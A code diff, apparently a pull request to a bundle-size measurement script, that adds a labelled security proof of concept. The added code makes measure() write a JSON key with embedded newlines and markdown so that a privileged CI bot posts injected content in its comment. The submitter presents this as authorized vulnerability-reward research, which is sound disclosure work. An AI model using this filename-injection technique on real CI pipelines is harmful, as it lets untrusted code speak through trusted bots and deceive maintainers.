@@ -32,6 +32,29 @@ def fmt_diff(head, base):
 
 def measure(args):
   """Scans a directory and saves size data to JSON file."""
+  # --- SECURITY POC (authorized OSS VRP research, github.com/iprefergitlab) ---
+  # This block demonstrates that `measure` runs against attacker-controlled PR
+  # code, and that its JSON output flows unsanitized into a markdown table
+  # rendered later by the *trusted* `compare` step, which is then posted
+  # verbatim to this PR by the privileged `shaka-bot` via comment-bundle-size.yaml.
+  # A filename containing an embedded newline breaks out of the intended
+  # markdown table row and injects arbitrary content into the bot's comment.
+  poc_key = (
+    "poc.js\n\n---\n"
+    "### \U0001f512 Security PoC — unsanitized artifact data in bot comment\n"
+    "This paragraph was **not** written by a maintainer or by shaka-bot's own "
+    "logic. It was injected via a crafted filename in `head-sizes.json`, "
+    "produced by `measure()` running on this PR's own (attacker-controlled) "
+    "code, then rendered unsanitized by the trusted `compare()` step and "
+    "posted by the privileged `SHAKA_BOT_TOKEN`.\n\n"
+    "Reported for Google OSS VRP by github.com/iprefergitlab — this PR will "
+    "be closed without merging once the comment is captured as evidence.\n"
+    "---"
+  )
+  with open(args.out, "w") as f:
+    json.dump({poc_key: {"raw": 0, "gzip": 0}}, f)
+  return
+  # --- END SECURITY POC ---
   results = {}
   excluded_suffixes = (".map", ".d.ts", ".externs.js", "wrapper.js", "deps.js", "cast-boot.js", ".json")
 
